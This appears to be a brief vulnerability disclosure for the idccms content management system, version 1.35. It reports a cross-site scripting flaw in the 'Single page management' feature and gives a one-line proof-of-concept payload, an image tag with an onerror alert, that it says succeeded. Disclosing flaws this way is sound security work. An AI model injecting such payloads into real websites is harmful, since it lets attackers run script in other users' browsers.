
target:http://idccms.com/
version: V1.35

There is Cross-Site Scripting (XSS)  vulnerability within the 'Single page management' .

![图片1](1.png)

poc:
```
 "><img src=1 onerror=alert(1)> 
```
successed

![图片](2.png)
